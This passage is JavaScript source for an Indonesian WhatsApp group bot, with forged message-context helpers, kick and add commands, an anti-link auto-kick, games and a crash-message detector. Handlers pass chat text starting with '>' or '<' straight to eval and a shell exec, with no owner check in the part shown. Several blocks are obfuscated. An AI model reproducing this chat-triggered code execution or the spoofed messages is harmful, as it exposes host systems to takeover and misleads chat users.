			hypermod.sendMessage(hehe, teks, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./hypermod.jpg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
		}
		const mentions = (teks, memberr, id) => {
			(id == null || id == undefined || id == false) ? hypermod.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : hypermod.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
		}
		const sendFileFromUrl = async(link, type, options) => {
hasil = await getBuffer(link)
hypermod.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
hypermod.sendMessage(from, hasil, type, options).catch(e => {
hypermod.sendMessage(from, { url : link }, type, options).catch(e => {
reply
console.log(e)
})
})
})
})
}
  const sendMediaURL = async(to, url, text="", mids=[]) =>{
				if(mids.length > 0){
					text = normalizeMention(to, text, mids)
				}
				const fn = Date.now() / 10000;
				const filename = fn.toString()
				let mime = ""
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						mime = res.headers['content-type']
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, filename, async function () {
					console.log('done');
					let media = fs.readFileSync(filename)
					let type = mime.split("/")[0]+"Message"
					if(mime === "image/gif"){
						type = MessageType.video
						mime = Mimetype.gif
					}
					if(mime.split("/")[0] === "audio"){
						mime = Mimetype.mp4Audio
					}
					hypermod.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
					
					fs.unlinkSync(filename)
				});
			}
		   const sendFakeStatus = (from, teks, faketeks) => {
				hypermod.sendMessage(from, teks, text, { thumbnail: dfrply, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./hypermod.jpg'), surface: 200, message: `Yuzzu-Bot`, orderTitle: `Yuzzu-Bot`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true }})
			}
			const sendFakeThumb = async function(from, url, title, desc){
				var anoim = {
					detectLinks: false
				}
				var qul = await hypermod.generateLinkPreview(url)
				qul.title = title
				qul.description = desc
				qul.jpegThumbnail = fs.readFileSync(`./hypermod.jpg`)
				hypermod.sendMessage(from, qul, MessageType.extendedText, anoim)
			}
            function speedText(speed) {
                let bits = speed * 8;
                const units = ['', 'K', 'M', 'G', 'T'];
                const places = [0, 1, 2, 3];
                let unit = 0;
                while (bits >= 2000 && unit < 4) {
                    unit++;
                    bits/= 1000;
                }
                return `${bits.toFixed(places[unit])} ${units[unit]}bps`;
            } 
           if (budo.startsWith(`>`)){
				const sep = budo.split("\n")
                let exc = budo.replace(sep[0]+"\n", "")
                const print = function(budo){
                    hypermod.sendMessage(from, util.format(budo))
                }
                console.log(exc)
                eval("(async () => {try{"+exc+"}catch(e){hypermod.sendMessage(from,  e.toString())}})()")
			}
			if (budo.startsWith(`<`)){
				const sep = budo.split("\n")
                let exc = budo.replace(sep[0]+"\n", "")
                exec(exc, (err, stdout) => {
					if (err) return hypermod.sendMessage(from, `root @dcode-denpa:~ ${err}`, text, { quoted: mek })
					if (stdout) {
						hypermod.sendMessage(from, stdout, text)
					}
				})
			}
			if(mek.key.fromMe){
			if (budo === `${prefix}public`){
				publik = true
				sendFakeStatus(from, 'Sukses', fake)
			}
			if (budo === `${prefix}self`){
				publik = false
				sendFakeStatus(from, 'Sukses', fake)
			}
		}
		if (budo === `${prefix}k`){
		    if (!isOwner) return reply(mess.only.ownerB)
		    if (!isGroup) return reply(mess.only.group)
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
			kicknya = mek.message.extendedTextMessage.contextInfo.participant
		    hypermod.groupRemove(from, [kicknya])
		    sendFakeStatus(from, 'bye', fake)
			}
			if (budo === `${prefix}a`){
			if (!isOwner) return reply(mess.only.ownerB)
			if (!isGroup) return reply(mess.only.group)
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
			addnya = mek.message.extendedTextMessage.contextInfo.participant
		    hypermod.groupAdd(from, [addnya])
		    sendFakeStatus(from, `Sukses`, fake)
			}
			// AUTO
			const _0x1e32=['lI9Kzw56lMPWzW','mJu5mZKXqvbAvMTJ','lI9TzwrPys9ZDgLJA2vYlW','mJGYzgj1EuLk','CMvHzezPBgvtEw5J','mtGYmti1ohH1vNvKtW','mte0ndK5uvfAEwrQ','mebZlNDOyxrZyxbWlM5LDa','lMPWzW','lI9TzwrPys9PBwfNzs8','odC4mdu4uMDOz1bm','mLHAvfzXBa','44cmigLTywDLiooaJsdIIRFVUi8G','C3rHDhvZqgjYB2fKy2fZDa','C2vUze1LC3nHz2u','mZu1mZa3vhj5tujb','mMvpuMzVvq','n0LVyMnpBW','yxvKAw8VBxa0','44cmigf1zgLViooaJsdIIRFVUi8G','ndm5otfJwwDVufi','44cmihn0AwnRzxiG44cniokkT++4JYa','lM1WmW','mtKZmu51vMfutq'];const _0x28cf0e=_0x2568;(function(_0x5e6930,_0x29a525){const _0x186e3e=_0x2568;while(!![]){try{const _0x104dff=parseInt(_0x186e3e(0x130))*parseInt(_0x186e3e(0x144))+-parseInt(_0x186e3e(0x13a))*-parseInt(_0x186e3e(0x131))+parseInt(_0x186e3e(0x13c))*-parseInt(_0x186e3e(0x138))+parseInt(_0x186e3e(0x13f))*parseInt(_0x186e3e(0x132))+parseInt(_0x186e3e(0x143))+parseInt(_0x186e3e(0x135))+-parseInt(_0x186e3e(0x13e));if(_0x104dff===_0x29a525)break;else _0x5e6930['push'](_0x5e6930['shift']());}catch(_0xfc8ccd){_0x5e6930['push'](_0x5e6930['shift']());}}}(_0x1e32,0x8f582));for(let anji of setik){budy===anji&&(result=fs[_0x28cf0e(0x13d)](_0x28cf0e(0x13b)+anji+'.webp'),hypermod[_0x28cf0e(0x147)](from,result,sticker,{'quoted':{'key':{'fromMe':![],'participant':'0@s.whatsapp.net',...from?{'remoteJid':_0x28cf0e(0x146)}:{}},'message':{'orderMessage':{'itemCount':0x0,'status':0xc8,'thumbnail':fs[_0x28cf0e(0x13d)](_0x28cf0e(0x139)),'surface':0xc8,'message':_0x28cf0e(0x136)+anji,'orderTitle':'「\x20sticker\x20」\x20⊷️\x20'+anji,'sellerJid':'0@s.whatsapp.net'}}}}));}for(let anju of vien){budy===anju&&(result=fs[_0x28cf0e(0x13d)]('./media/vn/'+anju+_0x28cf0e(0x137)),hypermod[_0x28cf0e(0x147)](from,result,audio,{'quoted':{'key':{'fromMe':![],'participant':'0@s.whatsapp.net',...from?{'remoteJid':_0x28cf0e(0x146)}:{}},'message':{'orderMessage':{'itemCount':0x0,'status':0xc8,'thumbnail':fs[_0x28cf0e(0x13d)](_0x28cf0e(0x139)),'surface':0xc8,'message':'「\x20audio\x20」\x20⊷️\x20'+anju,'orderTitle':_0x28cf0e(0x134)+anju,'sellerJid':_0x28cf0e(0x140)}}},'mimetype':_0x28cf0e(0x133),'duration':0x3b9ac9ff,'ptt':!![]}));}for(let anjh of imagi){budy===anjh&&(result=fs[_0x28cf0e(0x13d)](_0x28cf0e(0x142)+anjh+_0x28cf0e(0x141)),hypermod['sendMessage'](from,result,image,{'quoted':{'key':{'fromMe':![],'participant':'0@s.whatsapp.net',...from?{'remoteJid':_0x28cf0e(0x146)}:{}},'message':{'orderMessage':{'itemCount':0x0,'status':0xc8,'thumbnail':fs[_0x28cf0e(0x13d)](_0x28cf0e(0x139)),'surface':0xc8,'message':'「\x20image\x20」\x20⊷️\x20'+anjh,'orderTitle':_0x28cf0e(0x145)+anjh,'sellerJid':'0@s.whatsapp.net'}}}}));}function _0x2568(_0x5c60f5,_0x243808){_0x5c60f5=_0x5c60f5-0x130;let _0x1e328=_0x1e32[_0x5c60f5];if(_0x2568['wYlITc']===undefined){var _0x256842=function(_0x19941a){const _0x503b3b='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x535711='';for(let _0x317981=0x0,_0x4893fb,_0x48b948,_0x49e499=0x0;_0x48b948=_0x19941a['charAt'](_0x49e499++);~_0x48b948&&(_0x4893fb=_0x317981%0x4?_0x4893fb*0x40+_0x48b948:_0x48b948,_0x317981++%0x4)?_0x535711+=String['fromCharCode'](0xff&_0x4893fb>>(-0x2*_0x317981&0x6)):0x0){_0x48b948=_0x503b3b['indexOf'](_0x48b948);}return _0x535711;};_0x2568['OkPRAX']=function(_0xab1073){const _0x307ab4=_0x256842(_0xab1073);let _0x46316b=[];for(let _0x3c8d6e=0x0,_0x591a5d=_0x307ab4['length'];_0x3c8d6e<_0x591a5d;_0x3c8d6e++){_0x46316b+='%'+('00'+_0x307ab4['charCodeAt'](_0x3c8d6e)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x46316b);},_0x2568['qokPrw']={},_0x2568['wYlITc']=!![];}const _0x339f96=_0x1e32[0x0],_0x4c8a9a=_0x5c60f5+_0x339f96,_0x44c0a3=_0x2568['qokPrw'][_0x4c8a9a];return _0x44c0a3===undefined?(_0x1e328=_0x2568['OkPRAX'](_0x1e328),_0x2568['qokPrw'][_0x4c8a9a]=_0x1e328):_0x1e328=_0x44c0a3,_0x1e328;}for(var i=0x0;i<commandsDB['length'];i++){budy['toLowerCase']()===commandsDB[i]['pesan']&&reply(commandsDB[i]['balasan']);}
			// MUTE
        if (isMuted){
            if (!isGroupAdmins && !isOwner) return
            if (budy.toLowerCase().startsWith(`${prefix}unmute`)){
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                sendFakeStatus(from, `Bot telah diunmute di group ini`, fake)
            }
        }
			if (budy.includes("https://chat.whatsapp.com/")){
					if (!isGroup) return
					if (!isAntiLink) return
					if (isGroupAdmins) return reply('alahhh siaa :v admin grub mahh bebas yakan 😎 EZzz')
					hypermod.updatePresence(from, Presence.composing)
					if (messagesC.includes("@62812874133914")) return reply("izin diterima")
					var kic = `${sender.split("@")[0]}@s.whatsapp.net`
					reply(`Link Group Terdeteksi maaf ${sender.split("@")[0]} anda akan di kick dari group 5detik lagi`)
					setTimeout( () => {
					hypermod.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
					}, 5000)
					setTimeout( () => {
					hypermod.updatePresence(from, Presence.composing)
					reply("1detik")
					}, 4000)
					setTimeout( () => {
					hypermod.updatePresence(from, Presence.composing)
					reply("2detik")
					}, 3000)
					setTimeout( () => {
					hypermod.updatePresence(from, Presence.composing)
					reply("3detik")
					}, 2000)
					setTimeout( () => {
					hypermod.updatePresence(from, Presence.composing)
					reply("4detik")
					}, 1000)
					setTimeout( () => {
					hypermod.updatePresence(from, Presence.composing)
					reply("5detik")
					}, 0)
				    }
			if (bad.includes(messagesD)) {
				daui = fs.readFileSync('./toxic.mp3')
				hypermod.sendMessage(from, daui, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
				}
			
const sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : 🍇 : 🍐',
        '🍊 : 🍋 : 🔔', 
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🍌 : 🍇 : 🔔',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🍋 : 🍋 : 🍋 Win👑',
        '🔔 : 🔔 : 🍇',
        '🔔 : 🍇 : 🍇', 
        '🔔 : 🍐 : 🔔',
        '🍌 : 🍌 : 🍌 Win👑'
        ]
        var _0xcb95=['mJG1muz6ENrWza','twfZDwTHBIbbBMDRysbezw5Nyw4GqMvUyxi','oE+4J+kdOW','C3rYAw5NAwz5','icPuAwnuywnuB2uQiaOQsgfZAwWGqwTOAxi6kGOk','C3bSAxq','C2vUze1LC3nHz2u','mta3mZnkt0L4y3G','mZe2t0jLuuje','ugXHEwvYide6iea','qw5NA2eG','nU+4J+kdOW','lI9KyxrHyMfZzs90Awn0ywn0B2uUANnVBG','ChvZAa','ihzZiea','mLnQwLPLAW','yM9HCMq','Bw9Kzq','yw5NA2e','oo+4J+kdOW','AgfZt3DUuhjVCgvYDhK','ihrLBgfOigrPAxnP','vhvUz2D1ieDPBgLYyw4Gr2fU','mU+4J+kdOW','DgHLBG','sgfZAwWGoIbtzxjP','mE+4J+kdOW','nty2tgXAqwHe','z2LSAxi','icPuAwnuywnuB2uQiaOQx1bLCM1HAw5HBIbeCMf3iefRAwjHDcblzwj1BNr1yw5FkG','mJe2mZCXqLfHv3Hm','no+4J+kdOW','CgXHEwvYmG','zw5LBxK','zMLSDgvY','nE+4J+kdOW','nJLjuKXXu2S','vwrHAcbeAsbjC2KSieLZAsbzyw5NieXHAw4Gr2fU','ode4mda1tvbPvKjU','n++4J+kdOW','CgXHEwvYmq','cGPqBgf5zxiGmJOGqa','oti2AuzKuNnV','odq2odCYBevYrLft','icPuAwnuywnuB2uQiaPhAwXPCMfUiea','cLbSyxLLCJiGqa','Aw5JBhvKzxm','qhmUD2HHDhnHChaUBMv0','C3rLCa','ndm4nJeXAwDxu3Hi','sgfZAwWGoIba','D3jPDgvgAwXLu3LUyW','cLbSyxLLCJeGqa','cIaGicaGicaGia'];var _0x201cfe=_0x2dd8;function _0x2dd8(_0x253bd0,_0x530ee7){_0x253bd0=_0x253bd0-0xc0;var _0xcb9502=_0xcb95[_0x253bd0];if(_0x2dd8['owaekE']===undefined){var _0x2dd867=function(_0x51ddd6){var _0xe6cb8f='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x323516='';for(var _0x2cc05a=0x0,_0x319c84,_0xae22ce,_0x249173=0x0;_0xae22ce=_0x51ddd6['charAt'](_0x249173++);~_0xae22ce&&(_0x319c84=_0x2cc05a%0x4?_0x319c84*0x40+_0xae22ce:_0xae22ce,_0x2cc05a++%0x4)?_0x323516+=String['fromCharCode'](0xff&_0x319c84>>(-0x2*_0x2cc05a&0x6)):0x0){_0xae22ce=_0xe6cb8f['indexOf'](_0xae22ce);}return _0x323516;};_0x2dd8['WHMjdT']=function(_0x4333cd){var _0x13076e=_0x2dd867(_0x4333cd);var _0x4a9668=[];for(var _0x45fd1b=0x0,_0x3c9710=_0x13076e['length'];_0x45fd1b<_0x3c9710;_0x45fd1b++){_0x4a9668+='%'+('00'+_0x13076e['charCodeAt'](_0x45fd1b)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4a9668);},_0x2dd8['KVHTaX']={},_0x2dd8['owaekE']=!![];}var _0x30c54b=_0xcb95[0x0],_0x43e1d=_0x253bd0+_0x30c54b,_0x531021=_0x2dd8['KVHTaX'][_0x43e1d];return _0x531021===undefined?(_0xcb9502=_0x2dd8['WHMjdT'](_0xcb9502),_0x2dd8['KVHTaX'][_0x43e1d]=_0xcb9502):_0xcb9502=_0x531021,_0xcb9502;}(function(_0x3bf73b,_0x27c374){var _0x5b866a=_0x2dd8;while(!![]){try{var _0x134bd5=-parseInt(_0x5b866a(0xf3))+-parseInt(_0x5b866a(0xd5))*parseInt(_0x5b866a(0xdd))+parseInt(_0x5b866a(0xf0))*parseInt(_0x5b866a(0xc9))+-parseInt(_0x5b866a(0xdc))*-parseInt(_0x5b866a(0xc3))+-parseInt(_0x5b866a(0xca))+-parseInt(_0x5b866a(0xd0))+-parseInt(_0x5b866a(0xe4))*-parseInt(_0x5b866a(0xc5));if(_0x134bd5===_0x27c374)break;else _0x3bf73b['push'](_0x3bf73b['shift']());}catch(_0x28f4d2){_0x3bf73b['push'](_0x3bf73b['shift']());}}}(_0xcb95,0x7990d),getWin=async _0x30c54b=>{var _0x43e1d=['❌'],_0x531021=['⭕️'];if(_0x30c54b[0x0]==_0x43e1d&&_0x30c54b[0x1]==_0x43e1d&&_0x30c54b[0x2]==_0x43e1d)return _0x43e1d;if(_0x30c54b[0x3]==_0x43e1d&&_0x30c54b[0x4]==_0x43e1d&&_0x30c54b[0x5]==_0x43e1d)return _0x43e1d;if(_0x30c54b[0x6]==_0x43e1d&&_0x30c54b[0x7]==_0x43e1d&&_0x30c54b[0x8]==_0x43e1d)return _0x43e1d;if(_0x30c54b[0x0]==_0x531021&&_0x30c54b[0x1]==_0x531021&&_0x30c54b[0x2]==_0x531021)return _0x531021;if(_0x30c54b[0x3]==_0x531021&&_0x30c54b[0x4]==_0x531021&&_0x30c54b[0x5]==_0x531021)return _0x531021;if(_0x30c54b[0x6]==_0x531021&&_0x30c54b[0x7]==_0x531021&&_0x30c54b[0x8]==_0x531021)return _0x531021;if(_0x30c54b[0x0]==_0x43e1d&&_0x30c54b[0x4]==_0x43e1d&&_0x30c54b[0x8]==_0x43e1d)return _0x43e1d;if(_0x30c54b[0x2]==_0x43e1d&&_0x30c54b[0x4]==_0x43e1d&&_0x30c54b[0x6]==_0x43e1d)return _0x43e1d;if(_0x30c54b[0x0]==_0x531021&&_0x30c54b[0x4]==_0x531021&&_0x30c54b[0x8]==_0x531021)return _0x531021;if(_0x30c54b[0x2]==_0x531021&&_0x30c54b[0x4]==_0x531021&&_0x30c54b[0x6]==_0x531021)return _0x531021;if(_0x30c54b[0x0]==_0x43e1d&&_0x30c54b[0x3]==_0x43e1d&&_0x30c54b[0x6]==_0x43e1d)return _0x43e1d;if(_0x30c54b[0x1]==_0x43e1d&&_0x30c54b[0x4]==_0x43e1d&&_0x30c54b[0x7]==_0x43e1d)return _0x43e1d;if(_0x30c54b[0x2]==_0x43e1d&&_0x30c54b[0x5]==_0x43e1d&&_0x30c54b[0x8]==_0x43e1d)return _0x43e1d;if(_0x30c54b[0x0]==_0x531021&&_0x30c54b[0x3]==_0x531021&&_0x30c54b[0x6]==_0x531021)return _0x531021;if(_0x30c54b[0x1]==_0x531021&&_0x30c54b[0x4]==_0x531021&&_0x30c54b[0x7]==_0x531021)return _0x531021;if(_0x30c54b[0x2]==_0x531021&&_0x30c54b[0x5]==_0x531021&&_0x30c54b[0x8]==_0x531021)return _0x531021;return![];},generateBoard=async _0x51ddd6=>{var _0x1f4e05=_0x2dd8,_0xe6cb8f='',_0x323516=0x0;for(var _0x2cc05a of _0x51ddd6){_0x323516%0x3==0x0&&(_0xe6cb8f+=_0x1f4e05(0xd4)),_0xe6cb8f+=_0x2cc05a,_0x323516+=0x1;}return _0xe6cb8f;});if(tictactoe[_0x201cfe(0xe9)](senderNumber)&&['1','2','3','4','5','6','7','8','9'][_0x201cfe(0xcd)](budy)&&!isCmd){var {enemy,mode,board,step}=tictactoe[senderNumber];if([X,O][_0x201cfe(0xcd)](board[Number(budy)-0x1]))return await reply(_0x201cfe(0xdf)+budy+_0x201cfe(0xea));var data=tictactoe[senderNumber];data[_0x201cfe(0xc0)]=senderNumber,mode=mode==X?O:X,data[_0x201cfe(0xe6)]=mode,data[_0x201cfe(0xe5)][Number(budy)-0x1]=data[_0x201cfe(0xe6)],data[_0x201cfe(0xcf)]+=0x1;var player1=enemy,player2=senderNumber;step%0x2==0x0?(player1=senderNumber,player2=enemy):mode=data[_0x201cfe(0xe6)]==X?O:X;tictactoe[enemy]=data,delete tictactoe[senderNumber];var teks=_0x201cfe(0xde)+player1[_0x201cfe(0xda)]('@')[0x0]+'\x20('+mode+')';mode=mode==X?O:X;var text2=_0x201cfe(0xc8)+player2[_0x201cfe(0xda)]('@')[0x0]+'\x20('+mode+')';board=await generateBoard(data['board']);var win=await getWin(data[_0x201cfe(0xe5)]);if(win)return teks=board,teks+='\x0a\x0a',teks+='@'+player1+_0x201cfe(0xe3)+player2+'\x0a',win==mode?(teks+=_0x201cfe(0xd1)+player2+'\x20WIN',hypermod[_0x201cfe(0xdb)](from,teks,text,{'quoted':mek,'contextInfo':{'mentionedJid':[player1+_0x201cfe(0xce),player2+_0x201cfe(0xce)]}})[_0x201cfe(0xed)](()=>{var _0x1adb2f=_0x201cfe;delete tictactoe[enemy],fs[_0x1adb2f(0xd2)](_0x1adb2f(0xe1),JSON[_0x1adb2f(0xd8)](tictactoe));})):(teks+=_0x201cfe(0xd1)+player1+'\x20WIN',hypermod['sendMessage'](from,teks,text,{'quoted':mek,'contextInfo':{'mentionedJid':[player1+'@s.whatsapp.net',player2+_0x201cfe(0xce)]}})['then'](()=>{var _0x2aa4d1=_0x201cfe;delete tictactoe[enemy],fs[_0x2aa4d1(0xd2)]('./database/tictactoe.json',JSON[_0x2aa4d1(0xd8)](tictactoe));}));if(data['step']==0x9)return teks=board,teks+='\x0a\x0a',teks+='@'+player1+_0x201cfe(0xe3)+player2+'\x0a',teks+=_0x201cfe(0xee),hypermod[_0x201cfe(0xdb)](from,teks,text,{'quoted':mek,'contextInfo':{'mentionedJid':[player1+_0x201cfe(0xce),player2+'@s.whatsapp.net']}})[_0x201cfe(0xed)](()=>{var _0x430fed=_0x201cfe;delete tictactoe[enemy],fs['writeFileSync'](_0x430fed(0xe1),JSON[_0x430fed(0xd8)](tictactoe));});return player2==senderNumber?teks+=tunjuk:text2+=tunjuk,teks+='\x0a',teks+=board,teks+=text2,hypermod['sendMessage'](from,teks,text,{'quoted':mek,'contextInfo':{'mentionedJid':[player1+_0x201cfe(0xce),player2+_0x201cfe(0xce)]}})[_0x201cfe(0xed)](()=>{var _0x142364=_0x201cfe;fs['writeFileSync'](_0x142364(0xe1),JSON[_0x142364(0xd8)](tictactoe));});}if(isTTT&&isPlayer1){nuber=parseInt(body);if(isNaN(nuber))return;if(nuber<0x1||nuber>0x9)return reply('Masukan\x20Angka\x20Dengan\x20Benar');main=nana[_0x201cfe(0xc1)](_0x319c84=>_0x319c84['id']['includes'](from));if(!tttawal[_0x201cfe(0xcd)](main[0x0][_0x201cfe(0xe7)][nuber]))return reply(_0x201cfe(0xc4));if(main[0x0]['gilir'][_0x201cfe(0xcd)](sender))return reply('Tunggu\x20Giliran\x20Gan');s='❌',main[0x0][_0x201cfe(0xe7)][nuber]=s,main[0x0][_0x201cfe(0xf1)]=main[0x0][_0x201cfe(0xc7)],naa=nana[_0x201cfe(0xc1)](_0xae22ce=>!_0xae22ce['id'][_0x201cfe(0xcd)](from)),nana=naa,pop=main[0x0],nana[_0x201cfe(0xe2)](pop),tto=nana[_0x201cfe(0xc1)](_0x249173=>_0x249173['id'][_0x201cfe(0xcd)](from)),tty=tto[0x0],angka=tto[0x0][_0x201cfe(0xe7)],ttt=''+angka[0x1]+angka[0x2]+angka[0x3]+'\x0a'+angka[0x4]+angka[0x5]+angka[0x6]+'\x0a'+angka[0x7]+angka[0x8]+angka[0x9],ucapmenang=()=>{var _0x24bafd=_0x201cfe;return ucapan1='\x20*TicTacToe*\x20\x0aYeyyy\x20Permainan\x20Di\x20Menangkan\x20Oleh\x20*@'+tty[_0x24bafd(0xc7)][_0x24bafd(0xda)]('@')[0x0]+'*\x0a',ucapan2='\x20*TicTacToe*\x20\x0a*Hasil\x20Akhir:*\x0a\x0a'+ttt,hypermod[_0x24bafd(0xdb)](from,ucapan1,text,{'quoted':mek,'contextInfo':{'mentionedJid':[tty[_0x24bafd(0xc7)]]}}),reply(ucapan2),naa=nana[_0x24bafd(0xc1)](_0x4333cd=>!_0x4333cd['id'][_0x24bafd(0xcd)](from)),nana=naa;};if(angka[0x1]==s&&angka[0x2]==s&&angka[0x3]==s)return ucapmenang();if(angka[0x1]==s&&angka[0x4]==s&&angka[0x7]==s)return ucapmenang();if(angka[0x1]==s&&angka[0x5]==s&&angka[0x9]==s)return ucapmenang();if(angka[0x2]==s&&angka[0x5]==s&&angka[0x8]==s)return ucapmenang();if(angka[0x4]==s&&angka[0x5]==s&&angka[0x6]==s)return ucapmenang();if(angka[0x7]==s&&angka[0x8]==s&&angka[0x9]==s)return ucapmenang();if(angka[0x3]==s&&angka[0x5]==s&&angka[0x7]==s)return ucapmenang();if(angka[0x3]==s&&angka[0x6]==s&&angka[0x9]==s)return ucapmenang();if(!ttt[_0x201cfe(0xcd)]('1️⃣')&&!ttt[_0x201cfe(0xcd)](_0x201cfe(0xec))&&!ttt['includes']('3️⃣')&&!ttt['includes'](_0x201cfe(0xf4))&&!ttt[_0x201cfe(0xcd)](_0x201cfe(0xc2))&&!ttt[_0x201cfe(0xcd)](_0x201cfe(0xe0))&&!ttt['includes'](_0x201cfe(0xc6))&&!ttt['includes'](_0x201cfe(0xe8))&&!ttt['includes'](_0x201cfe(0xd7)))return ucapan1=_0x201cfe(0xf2),ucapan2=_0x201cfe(0xd9)+ttt,reply(ucapan1),reply(ucapan2),naa=nana[_0x201cfe(0xc1)](_0x13076e=>!_0x13076e['id'][_0x201cfe(0xcd)](from)),nana=naa;ucapan=_0x201cfe(0xcb)+tty[_0x201cfe(0xf5)][_0x201cfe(0xda)]('@')[0x0]+_0x201cfe(0xd3)+tty['player1'][_0x201cfe(0xda)]('@')[0x0]+'\x0a\x0a'+ttt,hypermod['sendMessage'](from,ucapan,text,{'quoted':mek,'contextInfo':{'mentionedJid':[tty['player1'],tty['player2']]}});}if(isTTT&&isPlayer2){nuber=parseInt(body);if(isNaN(nuber))return;if(nuber<0x1||nuber>0x9)return reply(_0x201cfe(0xd6));main=nana[_0x201cfe(0xc1)](_0x4a9668=>_0x4a9668['id']['includes'](from));if(!tttawal[_0x201cfe(0xcd)](main[0x0][_0x201cfe(0xe7)][nuber]))return reply(_0x201cfe(0xc4));if(main[0x0][_0x201cfe(0xf1)][_0x201cfe(0xcd)](sender))return reply(_0x201cfe(0xeb));s='⭕',main[0x0][_0x201cfe(0xe7)][nuber]=s,main[0x0][_0x201cfe(0xf1)]=main[0x0]['player2'],naa=nana['filter'](_0x45fd1b=>!_0x45fd1b['id'][_0x201cfe(0xcd)](from)),nana=naa,pop=main[0x0],nana[_0x201cfe(0xe2)](pop),tto=nana[_0x201cfe(0xc1)](_0x3c9710=>_0x3c9710['id'][_0x201cfe(0xcd)](from)),tty=tto[0x0],angka=tto[0x0][_0x201cfe(0xe7)],ttt=''+angka[0x1]+angka[0x2]+angka[0x3]+'\x0a'+angka[0x4]+angka[0x5]+angka[0x6]+'\x0a'+angka[0x7]+angka[0x8]+angka[0x9],ucapmenang=()=>{var _0x79f046=_0x201cfe;return ucapan1='\x20*TicTacToe*\x20\x0aYeyyy\x20Permainan\x20Di\x20Menangkan\x20Oleh\x20*@'+tty[_0x79f046(0xf5)][_0x79f046(0xda)]('@')[0x0]+'*\x0a',ucapan2=_0x79f046(0xd9)+ttt,hypermod['sendMessage'](from,ucapan1,text,{'quoted':mek,'contextInfo':{'mentionedJid':[tty[_0x79f046(0xf5)]]}}),reply(ucapan2),naa=nana[_0x79f046(0xc1)](_0x5ca105=>!_0x5ca105['id'][_0x79f046(0xcd)](from)),nana=naa;};if(angka[0x1]==s&&angka[0x2]==s&&angka[0x3]==s)return ucapmenang();if(angka[0x1]==s&&angka[0x4]==s&&angka[0x7]==s)return ucapmenang();if(angka[0x1]==s&&angka[0x5]==s&&angka[0x9]==s)return ucapmenang();if(angka[0x2]==s&&angka[0x5]==s&&angka[0x8]==s)return ucapmenang();if(angka[0x4]==s&&angka[0x5]==s&&angka[0x6]==s)return ucapmenang();if(angka[0x7]==s&&angka[0x8]==s&&angka[0x9]==s)return ucapmenang();if(angka[0x3]==s&&angka[0x5]==s&&angka[0x7]==s)return ucapmenang();if(angka[0x3]==s&&angka[0x6]==s&&angka[0x9]==s)return ucapmenang();if(!ttt[_0x201cfe(0xcd)](_0x201cfe(0xef))&&!ttt[_0x201cfe(0xcd)](_0x201cfe(0xec))&&!ttt[_0x201cfe(0xcd)]('3️⃣')&&!ttt[_0x201cfe(0xcd)]('4️⃣')&&!ttt['includes'](_0x201cfe(0xc2))&&!ttt[_0x201cfe(0xcd)](_0x201cfe(0xe0))&&!ttt[_0x201cfe(0xcd)](_0x201cfe(0xc6))&&!ttt[_0x201cfe(0xcd)](_0x201cfe(0xe8))&&!ttt[_0x201cfe(0xcd)]('9️⃣'))return ucapan1=_0x201cfe(0xf2),ucapan2=_0x201cfe(0xd9)+ttt,reply(ucapan1),reply(ucapan2),naa=nana[_0x201cfe(0xc1)](_0x233517=>!_0x233517['id']['includes'](from)),nana=naa;ucapan=_0x201cfe(0xcb)+tty[_0x201cfe(0xc7)][_0x201cfe(0xda)]('@')[0x0]+_0x201cfe(0xcc)+tty['player2'][_0x201cfe(0xda)]('@')[0x0]+'\x0a\x0a'+ttt,hypermod[_0x201cfe(0xdb)](from,ucapan,text,{'quoted':mek,'contextInfo':{'mentionedJid':[tty[_0x201cfe(0xc7)],tty['player2']]}});}else{}
        // BY MEMANS & MBB
if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3) {
 bugsol = mek.participants[0]
 tekuss = `\`\`\`Bug Terdeteksi\`\`\`












































 

 

























































































































































































\`\`\`@⁨${bugsol.split('@')[0]} Mengirim Bug Digrup ${groupName}\`\`\``
 hypermod.sendMessage(mek.key.remoteJid, 'WAH BUG NIH', MessageType.text)
 hypermod.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, { contexInfo: { mentionedJid:[bugsol] }})
}
